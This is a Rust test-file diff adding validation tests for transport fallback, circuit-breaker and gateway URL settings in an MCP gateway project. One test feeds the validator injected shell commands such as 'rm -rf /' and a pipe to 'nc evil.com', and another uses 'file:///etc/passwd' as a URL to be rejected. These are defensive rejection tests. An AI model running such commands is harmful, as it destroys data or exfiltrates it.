@@ -2638,6 +2638,346 @@ fallback_timeout_secs = 30
 }
 
 // ═══════════════════════════════════════════════════
+// PHASE 29: CROSS-TRANSPORT FALLBACK CONFIG TESTS
+// ═══════════════════════════════════════════════════
+
+#[test]
+fn test_transport_config_cross_fallback_defaults() {
+    let config = TransportConfig::default();
+    assert!(!config.cross_transport_fallback);
+    assert!(config.transport_overrides.is_empty());
+    assert_eq!(config.transport_circuit_breaker_failure_threshold, 3);
+    assert_eq!(config.transport_circuit_breaker_open_duration_secs, 30);
+    assert!(!config.stdio_fallback_enabled);
+    assert!(config.stdio_command.is_none());
+    assert!(config.validate().is_ok());
+}
+
+#[test]
+fn test_transport_config_cb_threshold_validation() {
+    use vellaveto_types::TransportProtocol;
+    // Zero threshold (below minimum)
+    let config = TransportConfig {
+        transport_circuit_breaker_failure_threshold: 0,
+        ..Default::default()
+    };
+    let err = config.validate().unwrap_err();
+    assert!(err.contains("transport_circuit_breaker_failure_threshold"));
+
+    // Above maximum
+    let config = TransportConfig {
+        transport_circuit_breaker_failure_threshold: 51,
+        ..Default::default()
+    };
+    assert!(config.validate().is_err());
+
+    // Valid boundary values
+    let config = TransportConfig {
+        transport_circuit_breaker_failure_threshold: 1,
+        ..Default::default()
+    };
+    assert!(config.validate().is_ok());
+
+    let config = TransportConfig {
+        transport_circuit_breaker_failure_threshold: 50,
+        ..Default::default()
+    };
+    assert!(config.validate().is_ok());
+
+    // Open duration boundaries
+    let config = TransportConfig {
+        transport_circuit_breaker_open_duration_secs: 0,
+        ..Default::default()
+    };
+    assert!(config.validate().is_err());
+
+    let config = TransportConfig {
+        transport_circuit_breaker_open_duration_secs: 601,
+        ..Default::default()
+    };
+    assert!(config.validate().is_err());
+
+    let config = TransportConfig {
+        transport_circuit_breaker_open_duration_secs: 600,
+        ..Default::default()
+    };
+    assert!(config.validate().is_ok());
+
+    let _ = TransportProtocol::Http; // suppress unused import warning
+}
+
+#[test]
+fn test_transport_config_overrides_empty_vec_rejected() {
+    use vellaveto_types::TransportProtocol;
+    let mut overrides = std::collections::HashMap::new();
+    overrides.insert("fs_*".to_string(), Vec::new());
+    let config = TransportConfig {
+        transport_overrides: overrides,
+        ..Default::default()
+    };
+    let err = config.validate().unwrap_err();
+    assert!(err.contains("must not be empty"));
+    let _ = TransportProtocol::Http;
+}
+
+#[test]
+fn test_transport_config_overrides_restricted_rejected() {
+    use vellaveto_types::TransportProtocol;
+    let mut overrides = std::collections::HashMap::new();
+    overrides.insert("db_*".to_string(), vec![TransportProtocol::Grpc]);
+    let config = TransportConfig {
+        transport_overrides: overrides,
+        restricted_transports: vec![TransportProtocol::Grpc],
+        ..Default::default()
+    };
+    let err = config.validate().unwrap_err();
+    assert!(err.contains("restricted transport"));
+}
+
+#[test]
+fn test_transport_config_stdio_requires_command() {
+    let config = TransportConfig {
+        stdio_fallback_enabled: true,
+        stdio_command: None,
+        ..Default::default()
+    };
+    let err = config.validate().unwrap_err();
+    assert!(err.contains("stdio_command"));
+}
+
+#[test]
+fn test_transport_config_stdio_empty_command_rejected() {
+    let config = TransportConfig {
+        stdio_fallback_enabled: true,
+        stdio_command: Some("  ".to_string()),
+        ..Default::default()
+    };
+    let err = config.validate().unwrap_err();
+    assert!(err.contains("must not be empty"));
+}
+
+#[test]
+fn test_transport_config_stdio_valid() {
+    let config = TransportConfig {
+        stdio_fallback_enabled: true,
+        stdio_command: Some("/usr/bin/mcp-server".to_string()),
+        ..Default::default()
+    };
+    assert!(config.validate().is_ok());
+}
+
+// FIND-R41-002: stdio_command must be absolute path
+#[test]
+fn test_transport_config_stdio_relative_path_rejected() {
+    let config = TransportConfig {
+        stdio_fallback_enabled: true,
+        stdio_command: Some("mcp-server".to_string()),
+        ..Default::default()
+    };
+    let err = config.validate().unwrap_err();
+    assert!(err.contains("absolute path"), "got: {}", err);
+}
+
+// FIND-R41-002: stdio_command with shell metacharacters rejected
+#[test]
+fn test_transport_config_stdio_metacharacters_rejected() {
+    for cmd in &[
+        "/usr/bin/cmd; rm -rf /",
+        "/usr/bin/cmd | nc evil.com",
+        "/usr/bin/cmd$(whoami)",
+        "/usr/bin/cmd`whoami`",
+        "/usr/bin/cmd > /tmp/out",
+    ] {
+        let config = TransportConfig {
+            stdio_fallback_enabled: true,
+            stdio_command: Some(cmd.to_string()),
+            ..Default::default()
+        };
+        assert!(
+            config.validate().is_err(),
+            "expected rejection for command: {}",
+            cmd
+        );
+    }
+}
+
+// FIND-R41-009: transport_overrides count bounded
+#[test]
+fn test_transport_config_overrides_count_bounded() {
+    use vellaveto_types::TransportProtocol;
+    let mut overrides = std::collections::HashMap::new();
+    for i in 0..101 {
+        overrides.insert(
+            format!("tool_{}", i),
+            vec![TransportProtocol::Http],
+        );
+    }
+    let config = TransportConfig {
+        transport_overrides: overrides,
+        ..Default::default()
+    };
+    let err = config.validate().unwrap_err();
+    assert!(err.contains("101 entries"), "got: {}", err);
+}
+
+// FIND-R41-014: transport_overrides empty key rejected
+#[test]
+fn test_transport_config_overrides_empty_key_rejected() {
+    use vellaveto_types::TransportProtocol;
+    let mut overrides = std::collections::HashMap::new();
+    overrides.insert(String::new(), vec![TransportProtocol::Http]);
+    let config = TransportConfig {
+        transport_overrides: overrides,
+        ..Default::default()
+    };
+    let err = config.validate().unwrap_err();
+    assert!(err.contains("empty key"), "got: {}", err);
+}
+
+// FIND-R41-014: transport_overrides null byte in key rejected
+#[test]
+fn test_transport_config_overrides_null_byte_rejected() {
+    use vellaveto_types::TransportProtocol;
+    let mut overrides = std::collections::HashMap::new();
+    overrides.insert("tool_\0bad".to_string(), vec![TransportProtocol::Http]);
+    let config = TransportConfig {
+        transport_overrides: overrides,
+        ..Default::default()
+    };
+    let err = config.validate().unwrap_err();
+    assert!(err.contains("null byte"), "got: {}", err);
+}
+
+#[test]
+fn test_transport_config_cross_fallback_serde_roundtrip() {
+    use vellaveto_types::TransportProtocol;
+    let mut overrides = std::collections::HashMap::new();
+    overrides.insert(
+        "fs_*".to_string(),
+        vec![TransportProtocol::Http, TransportProtocol::WebSocket],
+    );
+    let config = TransportConfig {
+        cross_transport_fallback: true,
+        transport_overrides: overrides,
+        transport_circuit_breaker_failure_threshold: 5,
+        transport_circuit_breaker_open_duration_secs: 60,
+        stdio_fallback_enabled: true,
+        stdio_command: Some("/usr/bin/mcp-server".to_string()),
+        ..Default::default()
+    };
+    let json_str = serde_json::to_string(&config).unwrap();
+    let deserialized: TransportConfig = serde_json::from_str(&json_str).unwrap();
+    assert_eq!(config, deserialized);
+}
+
+#[test]
+fn test_transport_config_overrides_valid() {
+    use vellaveto_types::TransportProtocol;
+    let mut overrides = std::collections::HashMap::new();
+    overrides.insert(
+        "db_*".to_string(),
+        vec![TransportProtocol::Grpc, TransportProtocol::Http],
+    );
+    let config = TransportConfig {
+        transport_overrides: overrides,
+        ..Default::default()
+    };
+    assert!(config.validate().is_ok());
+}
+
+#[test]
+fn test_gateway_backend_transport_urls_empty_url_rejected() {
+    use vellaveto_types::TransportProtocol;
+    let mut transport_urls = std::collections::HashMap::new();
+    transport_urls.insert(TransportProtocol::Grpc, "  ".to_string());
+    let config = GatewayConfig {
+        enabled: true,
+        backends: vec![BackendConfig {
+            id: "b1".to_string(),
+            url: "http://localhost:8000".to_string(),
+            tool_prefixes: vec!["test_".to_string()],
+            weight: 100,
+            transport_urls,
+        }],
+        ..Default::default()
+    };
+    let err = config.validate().unwrap_err();
+    assert!(err.contains("transport_urls"));
+    assert!(err.contains("must not be empty"));
+}
+
+#[test]
+fn test_gateway_backend_transport_urls_valid() {
+    use vellaveto_types::TransportProtocol;
+    let mut transport_urls = std::collections::HashMap::new();
+    transport_urls.insert(
+        TransportProtocol::Grpc,
+        "http://localhost:50051".to_string(),
+    );
+    transport_urls.insert(
+        TransportProtocol::WebSocket,
+        "ws://localhost:8000/ws".to_string(),
+    );
+    let config = GatewayConfig {
+        enabled: true,
+        backends: vec![BackendConfig {
+            id: "b1".to_string(),
+            url: "http://localhost:8000".to_string(),
+            tool_prefixes: vec!["test_".to_string()],
+            weight: 100,
+            transport_urls,
+        }],
+        ..Default::default()
+    };
+    assert!(config.validate().is_ok());
+}
+
+// FIND-R41-008: transport_urls with bad URL scheme rejected
+#[test]
+fn test_gateway_backend_transport_urls_bad_scheme_rejected() {
+    use vellaveto_types::TransportProtocol;
+    let mut transport_urls = std::collections::HashMap::new();
+    transport_urls.insert(TransportProtocol::Http, "file:///etc/passwd".to_string());
+    let config = GatewayConfig {
+        enabled: true,
+        backends: vec![BackendConfig {
+            id: "b1".to_string(),
+            url: "http://localhost:8000".to_string(),
+            tool_prefixes: vec!["test_".to_string()],
+            weight: 100,
+            transport_urls,
+        }],
+        ..Default::default()
+    };
+    let err = config.validate().unwrap_err();
+    assert!(err.contains("invalid URL scheme"), "got: {}", err);
+}
+
+// FIND-R41-008: WebSocket transport_url requires ws:// or wss://
+#[test]
+fn test_gateway_backend_transport_urls_ws_scheme_validated() {
+    use vellaveto_types::TransportProtocol;
+    let mut transport_urls = std::collections::HashMap::new();
+    transport_urls.insert(
+        TransportProtocol::WebSocket,
+        "http://localhost:8000/ws".to_string(),
+    );
+    let config = GatewayConfig {
+        enabled: true,
+        backends: vec![BackendConfig {
+            id: "b1".to_string(),
+            url: "http://localhost:8000".to_string(),
+            tool_prefixes: vec!["test_".to_string()],
+            weight: 100,
+            transport_urls,
+        }],
+        ..Default::default()
+    };
+    let err = config.validate().unwrap_err();
+    assert!(err.contains("invalid URL scheme"), "got: {}", err);
+}
+
+// ═══════════════════════════════════════════════════
 // PHASE 20: GATEWAY CONFIG TESTS
 // ═══════════════════════════════════════════════════
 
@@ -2702,12 +3042,14 @@ fn test_gateway_config_validate_duplicate_ids() {
             url: "http://a:8000".to_string(),
             tool_prefixes: vec!["a_".to_string()],
             weight: 100,
+            transport_urls: std::collections::HashMap::new(),
         },
         BackendConfig {
             id: "dup".to_string(),
             url: "http://b:8000".to_string(),
             tool_prefixes: vec!["b_".to_string()],
             weight: 100,
+            transport_urls: std::collections::HashMap::new(),
         },
     ];
     let err = config.validate().unwrap_err();
@@ -2723,6 +3065,7 @@ fn test_gateway_config_validate_zero_weight() {
         url: "http://a:8000".to_string(),
         tool_prefixes: vec![],
         weight: 0,
+        transport_urls: std::collections::HashMap::new(),
     }];
     let err = config.validate().unwrap_err();
     assert!(err.contains("weight must be >= 1"), "got: {}", err);
@@ -2737,6 +3080,7 @@ fn test_gateway_config_validate_interval_bounds() {
         url: "http://a:8000".to_string(),
         tool_prefixes: vec![],
         weight: 100,
+        transport_urls: std::collections::HashMap::new(),
     }];
 
     config.gateway.health_check_interval_secs = 4;
